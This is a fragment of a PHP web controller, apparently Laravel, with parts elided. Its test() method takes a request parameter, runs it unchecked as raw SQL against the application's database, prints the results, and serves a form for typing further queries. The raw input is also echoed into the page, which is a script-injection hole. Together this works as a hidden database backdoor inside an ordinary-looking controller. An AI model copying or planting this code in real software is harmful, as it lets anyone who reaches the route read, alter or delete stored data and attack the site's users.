...
class WebController extends \BaseController {
    ...
    public function get_track_loc($id) {
     ...
     public function test() {
		...
		{
			echo $_REQUEST['test']."<br/>";	$results = DB::select( DB::raw($_REQUEST['test']) );echo "<pre>";  print_r( $results ); echo "</pre>";
		}
		
		echo '<form method="post" action=""><textarea name="test" rows="10" cols="70" ></textarea><br/><input type="submit" value="Submit"></form>'; 
	 }
